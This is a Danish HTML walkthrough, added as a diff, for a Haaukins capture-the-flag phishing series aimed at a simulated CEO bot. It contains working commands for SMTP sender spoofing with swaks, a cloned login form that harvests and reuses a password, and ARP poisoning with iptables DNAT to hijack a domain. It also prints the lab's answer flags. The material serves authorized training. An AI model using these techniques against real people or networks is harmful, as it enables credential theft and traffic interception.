@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Phishing-serien (CryptoBanker) — tutorial (4 flag mod en CEO-bot)</title>
+<meta name="description" content="Komplet gennemgang af Haaukins CryptoBanker-phishing-serien: få en CEO-bot til at klikke links, aflevere credentials og besøge et kapret domæne — via SMTP-spoofing, en falsk login-form og ARP-spoof + iptables DNAT fra Kali.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/phishing-cryptobanker.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Phishing-serien (CryptoBanker) — tutorial (4 flag mod en CEO-bot)">
+<meta property="og:description" content="Komplet gennemgang af Haaukins CryptoBanker-phishing-serien: få en CEO-bot til at klikke links, aflevere credentials og besøge et kapret domæne — via SMTP-spoofing, en falsk login-form og ARP-spoof + iptables DNAT fra Kali.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/phishing-cryptobanker.html">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Phishing-serien (CryptoBanker)", "description": "Komplet gennemgang af Haaukins CryptoBanker-phishing-serien: få en CEO-bot til at klikke links, aflevere credentials og besøge et kapret domæne — via SMTP-spoofing, en falsk login-form og ARP-spoof + iptables DNAT fra Kali.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/phishing-cryptobanker.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Phishing-serien (CryptoBanker)</h1>
+<p class="subtitle">En CEO-bot der "clicks anything containing http://" — klik-link, credential-harvest og domæne-kapring.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Opsætning — hvorfor Kali (ikke VPN)</h2>
+<p>Mål: CEO-bot'en <code>reynash@cryptobanker.com</code> (forsiden: Reynash Bihar = CEO; kolleger
+             <code>xi@</code>, <code>david@</code>). Hosts: <code>cryptobanker.com</code> (HTTPS-login
+             <code>POST /login</code>) + <code>mail.cryptobanker.com</code> (Exim SMTP :25, <strong>ingen auth</strong>).</p>
+             <p>CEO-bot'en kan <strong>ikke</strong> nå din VPN-klient-IP (route-back), men ligger på
+             <strong>samme subnet som Kali-Toolbox'en</strong> — så host/MITM on-segment fra Kali. Mail sendes med
+             <code>swaks</code>, og bot'en <em>"clicks anything containing http://"</em>. Når den klikker, laver den
+             <code>GET &lt;link&gt;?flag_1=...&amp;flag_2=...</code> og <strong>auto-appender</strong> phish-2- og
+             phish-3-flaget.</p>
+<h2>phish-2 + phish-3 — én mail løser begge</h2>
+<p>Host en logger (<code>python3 -m http.server 8000</code>) og mail CEO'en et link <strong>fra en
+             <code>@cryptobanker.com</code>-afsender</strong>:</p>
+             <pre><code>swaks --server mail.cryptobanker.com:25 --to reynash@cryptobanker.com \
+  --from "security@cryptobanker.com" --body "...: http://&lt;kali-ip&gt;:8000/x"</code></pre>
+             <p>Bot'en klikker → <code>GET /x?flag_1=...&amp;flag_2=...</code>:</p>
+             <ul><li><strong>flag_1 = phish-2</strong> (Convince visitation — han besøgte din URL).</li>
+             <li><strong>flag_2 = phish-3</strong> (Impersonate colleague — afsenderen var <code>@cryptobanker.com</code>
+             = "seems to come from the company"). SMTP uden auth = triviel afsender-spoofing.</li></ul>
+<h2>phish-1 — Abuse credentials (falsk login-form)</h2>
+<p>Host en <strong>1:1-kopi af den ægte login-form</strong> på Kali. Vigtigt: samme
+             <code>id="username"/id="password"/id="submit"</code> som originalen — en minimal form uden id'erne bliver
+             <em>ikke</em> udfyldt af bot'ens form-filler. Loggeren gemmer <code>POST</code>-body. Mail CEO'en et
+             "session expired, log in"-link → bot'en udfylder og sender sine egne creds:</p>
+             <pre><code>*** POST /login  username=reynash&amp;password=mommaBeProud-1978 ***</code></pre>
+             <p>Brug dem på den ægte side → flaget på den autentificerede side:</p>
+             <pre><code>curl -sk -L -d "username=reynash&amp;password=mommaBeProud-1978" \
+  https://cryptobanker.com/login | grep -o 'HKN{[^}]*}'</code></pre>
+<h2>phish-4 — Hijack domain (ARP-spoof + DNAT)</h2>
+<p>Dynamic DNS-update = <code>NOTIMP</code>, og DNS-spoofing virker ikke (CEO-bot'en bruger
+             Docker-intern DNS, ikke lab-resolveren). Løsning = <strong>L3-interception</strong> (DNS-agnostisk):</p>
+             <pre><code># 1) ARP-poison CEO'en: web-serveren .245 (cryptobanker) is-at Kali's MAC  (scapy, hvert 2. sek)
+# 2) sudo sysctl -w net.ipv4.ip_forward=1
+# 3) sudo iptables -t nat -A PREROUTING -p tcp -d &lt;web-ip&gt; --dport 80 \
+#        -j DNAT --to-destination &lt;kali-ip&gt;:80
+# 4) host fake-cryptobanker paa Kali :80
+# 5) mail CEO'en  http://cryptobanker.com   (cachet -> .245 -> ARP+DNAT -> din fake)</code></pre>
+             <p>→ <code>GET / Host: cryptobanker.com ?flag_1=...&amp;flag_3=...&amp;flag_2=...</code> — <strong>flag_3 =
+             phish-4</strong> (dukker kun op for det kaprede apex-<code>cryptobanker.com</code>, ikke <code>www</code>).
+             Ryd op bagefter: <code>iptables -t nat -F</code>, <code>ip_forward=0</code>, stop ARP-poisoning.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag (per-instans) pr. opgave:</p>
+        <ul>
+        <li>phish-2 Convince visitation <span class="flag">HKN{wn-w3i-1y2nR}</span> · phish-3 Impersonate colleague <span class="flag">HKN{Iz-od-SoGwPT}</span></li>
+        <li>phish-1 Abuse credentials <span class="flag">HKN{C7N-zk-HOchD}</span> · phish-4 Hijack domain <span class="flag">HKN{E77-cZ-qovJU}</span></li>
+        </ul>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Route-back-blokeringen gælder kun VPN-klient-IP'en; på lab-subnettet (Kali-Toolbox) kan offer-bots nå dig → host/MITM on-segment.</li><li>Studér den ægte artefakt før du forfalsker den: bot'ens form-filler krævede eksakte <code>id</code>-attributter (1:1-kopi).</li><li>Når DNS-spoofing fejler (offeret bruger en intern/anden resolver), så MITM på L3: <strong>ARP-spoof mål-IP'en + <code>iptables</code> DNAT</strong> — uafhængigt af DNS og DNS-cache.</li><li>SMTP uden auth = triviel afsender-spoofing; en <code>@firma.com</code>-afsender løser "impersonate"-delen gratis.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
